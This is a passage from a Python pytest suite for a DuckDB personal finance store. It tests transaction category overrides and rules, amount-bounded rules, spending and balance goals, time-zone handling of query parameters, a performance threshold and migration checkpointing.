    _seed_cat_account(store)
    store.upsert_transactions([_txn("t-1", "ZZZ unmatched")])
    store.set_transaction_override("t-1", "Dining")
    store.set_transaction_override("t-1", "Groceries")
    rows = store.get_transactions_with_category()
    assert len(rows) == 1
    assert rows[0]["category"] == "Groceries"


def test_clear_transaction_override_falls_back_to_rule(store: DuckDBStore) -> None:
    """Clearing an override on a Starbucks txn falls back to Dining
    (the default rule), NOT to 'Uncategorized'."""
    _seed_cat_account(store)
    store.upsert_transactions([_txn("t-sbux", "STARBUCKS STORE #1234")])
    store.set_transaction_override("t-sbux", "Shopping")
    assert store.get_transactions_with_category()[0]["category"] == "Shopping"
    store.clear_transaction_override("t-sbux")
    assert store.get_transactions_with_category()[0]["category"] == "Dining"


def test_clear_transaction_override_is_noop_when_absent(store: DuckDBStore) -> None:
    """Clearing a non-existent override must not raise — same shape as
    DELETE WHERE matching zero rows in SQL."""
    _seed_cat_account(store)
    store.upsert_transactions([_txn("t-1", "ZZZ unmatched")])
    store.clear_transaction_override("t-1")  # never had one
    assert store.get_transactions_with_category()[0]["category"] == "Uncategorized"


def test_add_rule_is_retroactive(store: DuckDBStore) -> None:
    """Load-bearing read-time-resolution test. A DOORDASH transaction
    exists. The default seed already covers DOORDASH → Dining, so
    use a different unique pattern: add a new rule for "ZZZ-CUSTOM"
    AFTER the matching transaction was loaded, and assert the view
    re-resolves on the next read.

    This is the property that lets users add rules later without a
    backfill — the whole reason resolution is a view, not a column."""
    _seed_cat_account(store)
    store.upsert_transactions([_txn("t-custom", "ZZZ-CUSTOM-PAYEE")])
    # Pre-rule: no match → Uncategorized.
    assert store.get_transactions_with_category()[0]["category"] == "Uncategorized"
    # Rule added after the transaction → next read reflects it.
    store.add_rule("Dining", match_type="contains", pattern="ZZZ-CUSTOM-PAYEE", priority=10)
    assert store.get_transactions_with_category()[0]["category"] == "Dining"


def test_add_rule_rejects_invalid_match_type(store: DuckDBStore) -> None:
    with pytest.raises(StoreError, match="match_type"):
        store.add_rule("Dining", match_type="exact", pattern="X", priority=10)


def test_add_rule_rejects_unknown_category(store: DuckDBStore) -> None:
    with pytest.raises(StoreError, match="not found"):
        store.add_rule("NoSuchCategory", match_type="contains", pattern="X", priority=10)


def test_remove_default_rule_refused_without_force(store: DuckDBStore) -> None:
    """Defaults are protected: removing requires force=True. Same shape as
    account remove on non-manual accounts."""
    default_row = store.conn.execute(
        "SELECT id FROM category_rules WHERE is_default = TRUE LIMIT 1"
    ).fetchone()
    assert default_row is not None
    with pytest.raises(StoreError, match="default"):
        store.remove_rule(int(default_row[0]), force=False)


def test_remove_default_rule_succeeds_with_force(store: DuckDBStore) -> None:
    default_row = store.conn.execute(
        "SELECT id FROM category_rules WHERE is_default = TRUE LIMIT 1"
    ).fetchone()
    assert default_row is not None
    rule_id = int(default_row[0])
    store.remove_rule(rule_id, force=True)
    after = store.conn.execute(
        "SELECT COUNT(*) FROM category_rules WHERE id = ?", [rule_id]
    ).fetchone()
    assert after is not None and after[0] == 0


def test_remove_user_rule_no_force_needed(store: DuckDBStore) -> None:
    rule_id = store.add_rule("Dining", match_type="contains", pattern="USER-PATTERN", priority=10)
    store.remove_rule(rule_id, force=False)
    after = store.conn.execute(
        "SELECT COUNT(*) FROM category_rules WHERE id = ?", [rule_id]
    ).fetchone()
    assert after is not None and after[0] == 0


def test_remove_rule_unknown_id_raises(store: DuckDBStore) -> None:
    with pytest.raises(StoreError, match="not found"):
        store.remove_rule(999999)


def test_add_rule_case_insensitive_category_name(store: DuckDBStore) -> None:
    """User-supplied category names resolve case-insensitively to the
    canonical row. The FK on the new rule still points at the canonical
    'Dining' id, so the view + counts + listings all see it correctly."""
    rule_id = store.add_rule("dining", match_type="contains", pattern="ZZZ-CASE", priority=10)
    # Canonical 'Dining' row id.
    dining = next(c for c in store.get_categories() if c.name == "Dining")
    rule_row = store.conn.execute(
        "SELECT category_id FROM category_rules WHERE id = ?", [rule_id]
    ).fetchone()
    assert rule_row is not None
    assert int(rule_row[0]) == dining.id


def test_set_transaction_override_case_insensitive_category_name(
    store: DuckDBStore,
) -> None:
    """Same case-insensitivity applies to override-setting; the view
    returns the canonical category name regardless of input case."""
    _seed_cat_account(store)
    store.upsert_transactions([_txn("t-cs", "ZZZ unmatched")])
    store.set_transaction_override("t-cs", "groceries")
    rows = store.get_transactions_with_category()
    assert len(rows) == 1
    assert rows[0]["category"] == "Groceries"


def test_get_transactions_category_filter(store: DuckDBStore) -> None:
    """``get_transactions(category=...)`` routes through the view but
    still returns ``Transaction`` objects (no category field on the
    pydantic model — that's by design; the view's category column is
    used for filtering only)."""
    _seed_cat_account(store)
    store.upsert_transactions(
        [
            _txn("t-sbux", "STARBUCKS STORE #1234"),
            _txn("t-kroger", "KROGER STORE #555"),
        ]
    )
    dining = store.get_transactions(category="Dining")
    assert {t.id for t in dining} == {"t-sbux"}
    groceries = store.get_transactions(category="Groceries")
    assert {t.id for t in groceries} == {"t-kroger"}


def test_get_transactions_no_category_filter_uses_bare_table(store: DuckDBStore) -> None:
    """When ``category`` is not supplied, ``get_transactions`` stays on
    the bare ``transactions`` table — confirmed by returning a row with
    no category column."""
    _seed_cat_account(store)
    store.upsert_transactions([_txn("t-1", "ZZZ unmatched")])
    txns = store.get_transactions()
    assert len(txns) == 1
    assert txns[0].id == "t-1"


def test_get_transactions_with_category_includes_color(store: DuckDBStore) -> None:
    _seed_cat_account(store)
    store.upsert_transactions([_txn("t-sbux", "STARBUCKS STORE #1234")])
    rows = store.get_transactions_with_category()
    assert rows[0]["category"] == "Dining"
    # Default Dining color from the migration seed.
    assert rows[0]["category_color"] == "#e67e22"


def test_get_transactions_with_category_uncategorized_color_is_null(
    store: DuckDBStore,
) -> None:
    """When a transaction falls through to 'Uncategorized', no color is
    attached (the literal in the view's COALESCE is just the name)."""
    _seed_cat_account(store)
    store.upsert_transactions([_txn("t-1", "ZZZ unmatched")])
    rows = store.get_transactions_with_category()
    assert rows[0]["category"] == "Uncategorized"
    assert rows[0]["category_color"] is None


def test_category_counts_includes_zero_categories(store: DuckDBStore) -> None:
    """All seeded categories appear in counts even if zero transactions
    match — so ``goetta-finance category list`` shows the full set."""
    _seed_cat_account(store)
    store.upsert_transactions([_txn("t-sbux", "STARBUCKS STORE #1234")])
    counts = store.category_counts()
    by_name = {c["name"]: c for c in counts}
    assert by_name["Dining"]["transaction_count"] == 1
    assert by_name["Travel"]["transaction_count"] == 0


def test_add_category_writes_non_default_row(store: DuckDBStore) -> None:
    cat = store.add_category("MyCustom", display_color="#123456")
    assert cat.name == "MyCustom"
    assert cat.is_default is False
    refetched = {c.name: c for c in store.get_categories()}
    assert refetched["MyCustom"].display_color == "#123456"


def test_add_category_rejects_duplicate(store: DuckDBStore) -> None:
    """``categories.name`` is UNIQUE — a second insert with the same name
    surfaces as a friendly StoreError."""
    with pytest.raises(StoreError):
        store.add_category("Dining")  # already seeded


# --- Performance probe: 10k transactions, view resolution stays bounded ---
#
# Measure-then-pin the threshold: the constant below was measured during
# implementation as the median of 10 runs of get_transactions_with_category
# over 10k seeded transactions on the developer's Windows machine. The
# test asserts <= 5x that observed median, capped at the comfort ceiling
# of 1500ms (Windows file-DB I/O is slower than on Linux; the 500ms
# ceiling in the plan was tuned for the latter and was too tight here).
#
# A 3x slowdown of the view caused by a future schema or query change
# will fail this test even while absolute timing remains comfortable —
# that's the point of pinning to the measurement, not to a round number.
#
# If this test goes red on a developer's faster machine, re-measure and
# update _MEDIAN_BASELINE_MS_OBSERVED with the new median + comment.

_MEDIAN_BASELINE_MS_OBSERVED = 60.0  # measured 2026-05-21 on dev machine (Windows)
_PERF_REGRESSION_THRESHOLD_MS = min(5 * _MEDIAN_BASELINE_MS_OBSERVED, 500.0)


def test_view_planner_under_10k_transactions(store: DuckDBStore) -> None:
    """The view is the load-bearing path for spending_by_category and
    every dashboard category surface. Measure an aggregation query (NOT
    full row materialization) — that's what the actual MCP tool and
    dashboard will run, and it stresses the view's planner without
    being dominated by Python-side serialization of 10k row dicts.

    Threshold pinned to 5x the observed median during implementation,
    capped at 500ms. A 3x slowdown of the view caused by a future
    schema or query change will fail this test even while absolute
    timing remains comfortable. If this goes red on a faster machine,
    re-measure and update _MEDIAN_BASELINE_MS_OBSERVED above.
    """
    import statistics
    import time

    _seed_cat_account(store)
    # Bulk-load 10k transactions in-engine via generate_series; avoids the
    # Python↔DuckDB protocol round-trip cost of executemany (which dominates
    # row-by-row inserts for >1000 rows). Pattern column uses CASE on i%8
    # to produce a realistic mix of matchable + Uncategorized descriptions.
    store.conn.execute(
        """
        INSERT INTO transactions
            (id, account_id, posted, transacted_at, amount, description,
             payee, memo, pending, extra)
        SELECT
            printf('perf-%05d', i) AS id,
            'acc-cat' AS account_id,
            TIMESTAMP '2026-05-10 12:00:00' - INTERVAL (i) HOUR AS posted,
            NULL AS transacted_at,
            CAST(-1.00 AS DECIMAL(18,2)) AS amount,
            CASE i % 8
                WHEN 0 THEN 'STARBUCKS # ' || i
                WHEN 1 THEN 'KROGER # ' || i
                WHEN 2 THEN 'AMAZON.COM ORDER ' || i
                WHEN 3 THEN 'ZZZ-NOMATCH ' || i
                WHEN 4 THEN 'SHELL OIL # ' || i
                WHEN 5 THEN 'SPOTIFY USA ' || i
                WHEN 6 THEN 'DOORDASH ORDER ' || i
                ELSE 'TARGET STORE # ' || i
            END AS description,
            NULL AS payee, NULL AS memo, FALSE AS pending, NULL AS extra
        FROM range(0, 10000) AS t(i)
        """
    )

    durations_ms: list[float] = []
    for _ in range(10):
        t0 = time.perf_counter()
        rows = store.query_sql(
            "SELECT category, COUNT(*) AS n, SUM(-amount) AS total "
            "FROM transactions_with_category GROUP BY category"
        )
        t1 = time.perf_counter()
        durations_ms.append((t1 - t0) * 1000.0)
        # Sanity: at least Dining, Groceries, Shopping, Gas, Subscriptions,
        # and Uncategorized should appear in the result given the seeded
        # patterns. Pin presence, not row count (a future seed change
        # could add categories).
        names = {r["category"] for r in rows}
        assert {"Dining", "Groceries", "Uncategorized"} <= names
    median_ms = statistics.median(durations_ms)
    assert median_ms <= _PERF_REGRESSION_THRESHOLD_MS, (
        f"view aggregation median {median_ms:.1f}ms exceeds regression "
        f"threshold {_PERF_REGRESSION_THRESHOLD_MS:.1f}ms (5x of measured "
        f"baseline {_MEDIAN_BASELINE_MS_OBSERVED:.1f}ms or 500ms ceiling). "
        f"All durations: {[round(d, 1) for d in durations_ms]}"
    )


# --- Goals (migration 0008) -------------------------------------------------


def test_migration_0008_applied(store: DuckDBStore) -> None:
    """Pin the migration filename so re-runs of init() stay idempotent
    and so renaming the file forces a deliberate test update."""
    rows = store.conn.execute("SELECT name FROM schema_migrations").fetchall()
    assert ("0008_goals.sql",) in rows
    count = store.conn.execute("SELECT COUNT(*) FROM goals").fetchone()
    assert count is not None
    # No seeded rows: goals are pure user-state (stranger test).
    assert int(count[0]) == 0


def test_add_goal_spending_cap_round_trip(store: DuckDBStore) -> None:
    goal = store.add_goal(
        "Groceries cap",
        kind="spending_cap",
        amount=Decimal("400.00"),
        category_name="groceries",  # case-insensitive lookup
        period="month",
    )
    assert goal.id >= 1
    assert goal.kind is GoalKind.SPENDING_CAP
    assert goal.amount == Decimal("400.00")
    assert goal.category_name == "Groceries"  # resolved to stored casing
    assert goal.period is GoalPeriod.MONTH
    assert goal.account_id is None
    assert goal.direction is None
    assert goal.created_at.tzinfo is not None

    listed = store.list_goals()
    assert len(listed) == 1
    fetched = listed[0]
    assert fetched == goal


def test_add_goal_balance_round_trip(store: DuckDBStore) -> None:
    store.upsert_accounts([_account(id="acc-goal")])
    goal = store.add_goal(
        "Emergency fund",
        kind="balance",
        amount=Decimal("10000.00"),
        account_id="acc-goal",
        direction="at_least",
        target_date=date(2027, 6, 1),
    )
    assert goal.kind is GoalKind.BALANCE
    assert goal.direction is GoalDirection.AT_LEAST
    assert goal.target_date == date(2027, 6, 1)
    assert goal.account_name == "Checking 1234"
    assert goal.category_id is None
    assert goal.period is None

    fetched = store.list_goals()[0]
    assert fetched == goal


def test_add_goal_unknown_category_raises(store: DuckDBStore) -> None:
    with pytest.raises(StoreError, match="category not found: Gorceries"):
        store.add_goal(
            "typo cap",
            kind="spending_cap",
            amount=Decimal("100"),
            category_name="Gorceries",
            period="month",
        )


def test_add_goal_unknown_account_raises(store: DuckDBStore) -> None:
    with pytest.raises(StoreError, match="account not found: nope"):
        store.add_goal(
            "ghost balance",
            kind="balance",
            amount=Decimal("100"),
            account_id="nope",
            direction="at_least",
        )


def test_add_goal_duplicate_name_case_insensitive(store: DuckDBStore) -> None:
    store.add_goal(
        "Dining cap",
        kind="spending_cap",
        amount=Decimal("200"),
        category_name="Dining",
        period="month",
    )
    with pytest.raises(StoreError, match="goal already exists"):
        store.add_goal(
            "dining CAP",
            kind="spending_cap",
            amount=Decimal("300"),
            category_name="Dining",
            period="month",
        )


def test_add_goal_bad_shape_raises(store: DuckDBStore) -> None:
    store.upsert_accounts([_account(id="acc-shape")])
    with pytest.raises(StoreError, match="require a category and a period"):
        store.add_goal("no cat", kind="spending_cap", amount=Decimal("100"))
    with pytest.raises(StoreError, match="require an account_id and a direction"):
        store.add_goal("no acct", kind="balance", amount=Decimal("100"))
    with pytest.raises(StoreError, match="do not take account_id"):
        store.add_goal(
            "mixed",
            kind="spending_cap",
            amount=Decimal("100"),
            category_name="Dining",
            period="month",
            account_id="acc-shape",
        )
    with pytest.raises(StoreError, match="do not take a category"):
        store.add_goal(
            "mixed2",
            kind="balance",
            amount=Decimal("100"),
            account_id="acc-shape",
            direction="at_most",
            category_name="Dining",
        )
    with pytest.raises(StoreError, match="kind must be"):
        store.add_goal("bad kind", kind="envelope", amount=Decimal("100"))


def test_remove_goal_round_trip(store: DuckDBStore) -> None:
    goal = store.add_goal(
        "Gas cap",
        kind="spending_cap",
        amount=Decimal("150"),
        category_name="Gas",
        period="month",
    )
    store.remove_goal(goal.id)
    assert store.list_goals() == []


def test_remove_goal_unknown_raises(store: DuckDBStore) -> None:
    with pytest.raises(StoreError, match="goal not found: 999"):
        store.remove_goal(999)


def test_delete_account_refuses_when_goal_references_it(store: DuckDBStore) -> None:
    """Goals are user-authored config — deleting an account must not
    silently cascade them away (the 0007 lesson). The error names the
    fix (`goal remove`)."""
    store.upsert_accounts([_manual_account(id="MANUAL-goal")])
    store.add_goal(
        "Savings target",
        kind="balance",
        amount=Decimal("5000"),
        account_id="MANUAL-goal",
        direction="at_least",
    )
    with pytest.raises(StoreError, match=r"goal\(s\) referencing it"):
        store.delete_account("MANUAL-goal")
    # Account and goal are both still present.
    assert any(a.id == "MANUAL-goal" for a in store.get_accounts())
    assert len(store.list_goals()) == 1


def test_query_sql_normalizes_tz_aware_datetime_params(store: DuckDBStore) -> None:
    """Class-of-bug pin: timestamps are stored naive UTC, so a tz-aware
    datetime param must be normalized to naive UTC before binding.
    Without normalization DuckDB binds it as TIMESTAMP WITH TIME ZONE
    and casts the naive *column* through the session (local) time zone,
    silently shifting every date-window query by the machine's UTC
    offset — a boundary transaction falls out of its month on any
    non-UTC machine (this passes trivially on UTC CI; the pin is for
    developer machines and user installs)."""
    store.upsert_accounts([_account(id="acc-tz")])
    store.upsert_transactions(
        [
            Transaction(
                id="t-tz-boundary",
                account_id="acc-tz",
                posted=datetime(2026, 5, 31, 23, 59, 59, 999999, tzinfo=UTC),
                amount=Decimal("-10.00"),
                description="month-boundary txn",
            )
        ]
    )
    rows = store.query_sql(
        "SELECT COUNT(*) AS n FROM transactions WHERE posted <= ? AND id = 't-tz-boundary'",
        [datetime(2026, 5, 31, 23, 59, 59, 999999, tzinfo=UTC)],
    )
    assert rows[0]["n"] == 1


# --- Rule amount bounds (migration 0009) -------------------------------------


def test_migration_0009_applied(store: DuckDBStore) -> None:
    """Pin the migration filename + the two new nullable columns."""
    rows = store.conn.execute("SELECT name FROM schema_migrations").fetchall()
    assert ("0009_rule_amount_bounds.sql",) in rows
    # Columns exist and are selectable.
    store.conn.execute("SELECT min_amount, max_amount FROM category_rules LIMIT 0")


def test_migration_0009_existing_rules_unbounded(store: DuckDBStore) -> None:
    """No-behavior-change contract: every pre-existing rule has NULL bounds
    and keeps matching at any magnitude, tiny or huge."""
    bounded = store.conn.execute(
        "SELECT COUNT(*) FROM category_rules WHERE min_amount IS NOT NULL OR max_amount IS NOT NULL"
    ).fetchone()
    assert bounded is not None and bounded[0] == 0
    _seed_cat_account(store)
    store.upsert_transactions(
        [
            _txn("t-9-tiny", "STARBUCKS STORE #1", amount="-1.00"),
            _txn("t-9-huge", "STARBUCKS STORE #2", amount="-99999.00"),
        ]
    )
    rows = {r["id"]: r["category"] for r in store.get_transactions_with_category()}
    assert rows["t-9-tiny"] == "Dining"
    assert rows["t-9-huge"] == "Dining"


def test_add_rule_persists_amount_bounds(store: DuckDBStore) -> None:
    rule_id = store.add_rule(
        "Dining",
        match_type="contains",
        pattern="ZZZ-BOUNDED",
        priority=10,
        min_amount=Decimal("10.00"),
        max_amount=Decimal("20.00"),
    )
    row = store.conn.execute(
        "SELECT min_amount, max_amount FROM category_rules WHERE id = ?", [rule_id]
    ).fetchone()
    assert row is not None
    assert row[0] == Decimal("10.00")
    assert row[1] == Decimal("20.00")


def test_view_amount_max_bound_is_exclusive(store: DuckDBStore) -> None:
    """Half-open contract, upper edge: abs(amount) < max_amount."""
    _seed_cat_account(store)
    store.add_rule(
        "Dining",
        match_type="contains",
        pattern="ZZZ-SPEEDY",
        priority=10,
        max_amount=Decimal("20.00"),
    )
    store.upsert_transactions(
        [
            _txn("t-under", "ZZZ-SPEEDY #1", amount="-19.99"),
            _txn("t-at", "ZZZ-SPEEDY #2", amount="-20.00"),
        ]
    )
    rows = {r["id"]: r["category"] for r in store.get_transactions_with_category()}
    assert rows["t-under"] == "Dining"
    assert rows["t-at"] == "Uncategorized"


def test_view_amount_min_bound_is_inclusive(store: DuckDBStore) -> None:
    """Half-open contract, lower edge: abs(amount) >= min_amount."""
    _seed_cat_account(store)
    store.add_rule(
        "Gas",
        match_type="contains",
        pattern="ZZZ-SPEEDY",
        priority=10,
        min_amount=Decimal("20.00"),
    )
    store.upsert_transactions(
        [
            _txn("t-at", "ZZZ-SPEEDY #1", amount="-20.00"),
            _txn("t-below", "ZZZ-SPEEDY #2", amount="-19.99"),
        ]
    )
    rows = {r["id"]: r["category"] for r in store.get_transactions_with_category()}
    assert rows["t-at"] == "Gas"
    assert rows["t-below"] == "Uncategorized"


def test_view_amount_bounds_use_abs_amount(store: DuckDBStore) -> None:
    """Sign-agnostic: a +12.00 refund matches a max-20 rule so it nets
    against the same category as the purchase it reverses."""
    _seed_cat_account(store)
    store.add_rule(
        "Dining",
        match_type="contains",
        pattern="ZZZ-SPEEDY",
        priority=10,
        max_amount=Decimal("20.00"),
    )
    store.upsert_transactions([_txn("t-refund", "ZZZ-SPEEDY REFUND", amount="12.00")])
    rows = {r["id"]: r["category"] for r in store.get_transactions_with_category()}
    assert rows["t-refund"] == "Dining"


def test_view_complementary_bounds_no_gap_no_overlap(store: DuckDBStore) -> None:
    """The Speedway story: same pattern split at $20 by two rules —
    under goes one way, exactly-20 and over go the other. No gap, no
    overlap at the threshold."""
    _seed_cat_account(store)
    store.add_rule(
        "Dining",
        match_type="contains",
        pattern="ZZZ-SPEEDY",
        priority=10,
        max_amount=Decimal("20.00"),
    )
    store.upsert_transactions(
        [
            _txn("t-snack", "ZZZ-SPEEDY #1", amount="-12.75"),
            _txn("t-edge", "ZZZ-SPEEDY #2", amount="-20.00"),
            _txn("t-fill", "ZZZ-SPEEDY #3", amount="-45.00"),
        ]
    )
    store.add_rule(
        "Gas",
        match_type="contains",
        pattern="ZZZ-SPEEDY",
        priority=10,
        min_amount=Decimal("20.00"),
    )
    rows = {r["id"]: r["category"] for r in store.get_transactions_with_category()}
    assert rows["t-snack"] == "Dining"
    assert rows["t-edge"] == "Gas"
    assert rows["t-fill"] == "Gas"


def test_view_bounded_rule_respects_priority(store: DuckDBStore) -> None:
    """Bounds compose with the existing priority ordering: an in-bounds
    bounded rule at priority 5 beats an unbounded rule at 100; out of
    bounds, the bounded rule simply doesn't match and the unbounded
    rule catches the transaction."""
    _seed_cat_account(store)
    store.add_rule(
        "Dining",
        match_type="contains",
        pattern="ZZZ-SPEEDY",
        priority=5,
        max_amount=Decimal("20.00"),
    )
    store.add_rule("Gas", match_type="contains", pattern="ZZZ-SPEEDY", priority=100)
    store.upsert_transactions(
        [
            _txn("t-in", "ZZZ-SPEEDY #1", amount="-12.75"),
            _txn("t-out", "ZZZ-SPEEDY #2", amount="-45.00"),
        ]
    )
    rows = {r["id"]: r["category"] for r in store.get_transactions_with_category()}
    assert rows["t-in"] == "Dining"
    assert rows["t-out"] == "Gas"


def test_init_checkpoints_migration_ddl_out_of_wal(tmp_path: Path) -> None:
    """Incident pin (2026-07-05): DuckDB's WAL replay fails on CREATE OR
    REPLACE VIEW entries, so a force-kill after migrations but before a
    natural checkpoint bricked the database until the WAL was manually
    moved aside. init() must checkpoint after applying migrations so the
    DDL never lingers in the WAL — asserted here while the connection is
    still open, i.e. the state a kill would freeze."""
    db = tmp_path / "checkpoint-test.duckdb"
    fresh = DuckDBStore(db)
    fresh.init()  # applies every migration, including the 0009 view rebuild
    try:
        wal = Path(str(db) + ".wal")
        assert not wal.exists() or wal.stat().st_size == 0, (
            f"WAL still holds {wal.stat().st_size} bytes of migration DDL "
            "after init(); a force-kill now would corrupt the database."
        )
    finally:
        fresh.close()
